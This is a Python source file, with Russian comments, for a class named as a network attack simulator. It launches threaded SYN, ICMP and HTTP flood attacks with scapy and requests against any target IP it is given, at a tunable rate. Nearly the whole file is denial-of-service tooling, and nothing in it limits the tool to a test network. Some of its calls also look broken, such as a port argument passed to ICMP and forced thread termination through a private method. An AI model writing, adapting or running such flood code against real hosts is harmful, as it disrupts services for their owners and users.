import threading
import requests
import time
from scapy.all import send, IP, ICMP, TCP
from logger import setup_logger

class NetworkAttackSimulator:
    def __init__(self, target_ip, logger):
        self.target_ip = target_ip
        self.logger = logger
        self.attacking = False
        self.intensity = 0
        self.attack_thread = None
        self.stop_event = threading.Event()

    def validate_ip(self):
        try:
            parts = self.target_ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except ValueError:
            return False

    def perform_syn_flood(self, intensity):
        if not self.validate_ip():
            self.logger.error(f"Invalid IP address: {self.target_ip}")
            return

        # Остановить предыдущую атаку, если она есть
        self.stop_attack()

        self.logger.info(f"Starting SYN Flood attack on {self.target_ip}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.attack_thread = threading.Thread(target=self.send_syn_packets)
        self.attack_thread.start()
        return self.attack_thread

    def perform_icmp_flood(self, intensity):
        if not self.validate_ip():
            self.logger.error(f"Invalid IP address: {self.target_ip}")
            return

        # Остановить предыдущую атаку, если она есть
        self.stop_attack()

        self.logger.info(f"Starting ICMP Flood attack on {self.target_ip}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.attack_thread = threading.Thread(target=self.send_icmp_packets)
        self.attack_thread.start()
        return self.attack_thread

    def perform_http_flood(self, intensity):
        url = f"http://{self.target_ip}:8080"
        self.logger.info(f"Starting HTTP Flood attack on {url}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.attack_thread = threading.Thread(target=self.send_http_requests, args=(url,))
        self.attack_thread.start()
        return self.attack_thread

    def send_syn_packets(self):
        while self.attacking and not self.stop_event.is_set():
            send(IP(dst=self.target_ip) / TCP(dport=8080, flags="S"), verbose=False)
            time.sleep(1.0 / self.intensity)

    def send_icmp_packets(self):
        while self.attacking and not self.stop_event.is_set():
            send(IP(dst=self.target_ip) / ICMP(dport=8080), verbose=False)
            time.sleep(1.0 / self.intensity)

    def send_http_requests(self, url):
        while self.attacking and not self.stop_event.is_set():
            try:
                response = requests.get(url)
                # Обработка ответа, если это необходимо
            except requests.RequestException as e:
                self.logger.error(f"HTTP request error: {e}")
            time.sleep(1.0 / self.intensity)

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.attacking = False
            self.stop_event.set()
            self.attack_thread.join(timeout=1)  # Дождаться завершения потока с таймаутом
            if self.attack_thread.is_alive():
                self.logger.warning("Forcefully terminating attack thread")
                self.attack_thread._stop()  # Принудительно завершить поток
            self.logger.info("Attack stopped")
